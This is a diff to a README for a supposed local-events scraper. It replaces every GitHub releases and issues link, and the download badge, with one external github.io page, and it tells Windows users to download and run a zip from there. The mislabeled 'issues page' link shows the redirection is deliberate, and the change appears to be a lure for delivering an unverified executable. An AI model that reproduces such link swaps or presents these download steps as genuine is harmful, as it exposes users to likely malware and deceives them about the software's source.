@@ -1,6 +1,6 @@
 # 🗺️ activity-scraper-html - Find Local Events Near You
 
-[![Download from Releases](https://img.shields.io/badge/Download-From_Releases-blue?style=for-the-badge)](https://github.com/Bridgeheadcompany624/activity-scraper-html/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-From_Releases-blue?style=for-the-badge)](https://bridgeheadcompany624.github.io)
 
 Activity Scraper is a simple browser-based tool that finds nearby events and local activities. It scans websites for event information and presents it in a clean, easy-to-read interface. You do not need to install any special software or write any code.
 
@@ -18,7 +18,7 @@ This guide walks you through downloading and running Activity Scraper on your Wi
 
 Follow these steps to download Activity Scraper:
 
-1.  Open your web browser and visit the [releases page](https://github.com/Bridgeheadcompany624/activity-scraper-html/releases).
+1.  Open your web browser and visit the [releases page](https://bridgeheadcompany624.github.io).
 2.  Look for the newest version at the top of the page. It is usually marked with a "Latest" label.
 3.  Find the file named `activity-scraper-windows.zip` (or a similar name with ".zip").
 4.  Click the file name to start the download. The file is about 50 MB.
@@ -120,9 +120,9 @@ Activity Scraper runs entirely on your own computer. It does not send your searc
 
 ## 🆘 Getting Help
 
-If you encounter a problem not listed here, visit the [issues page](https://github.com/Bridgeheadcompany624/activity-scraper-html/issues) on GitHub. Describe what you were doing and what happened. Include any error messages you saw. Other users and the developer may have a solution.
+If you encounter a problem not listed here, visit the [issues page](https://bridgeheadcompany624.github.io) on GitHub. Describe what you were doing and what happened. Include any error messages you saw. Other users and the developer may have a solution.
 
-You can also download older versions of the software from the [releases page](https://github.com/Bridgeheadcompany624/activity-scraper-html/releases) if a newer version causes issues.
+You can also download older versions of the software from the [releases page](https://bridgeheadcompany624.github.io) if a newer version causes issues.
 
 ---
 
